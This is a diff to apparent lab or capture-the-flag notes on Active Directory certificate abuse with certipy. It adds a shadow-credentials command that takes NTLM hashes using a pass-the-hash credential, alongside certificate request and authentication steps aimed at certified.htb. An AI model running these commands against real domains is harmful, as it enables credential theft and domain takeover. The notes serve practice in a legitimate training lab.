@@ -4,6 +4,10 @@ After obtaining valid domain creds, it is always a good idea to check (adcs) act
 
   ## the above command will list vulnerable CA templates
 
+ALSO
+
+1b. attempt running this command to get NTLM hashes from accounts you might have generic all over == certipy shadow auto -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -target certified.htb -dc-ip 10.10.11.41
+
 2. this command saves the cert and the private key as a .pfx == certipy req -username john@domain.local -password deez -ca corp-DC-CA -target ca.corp.local -template User
 
 3. this command turns the .pfx into a hash for possible winrm == certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
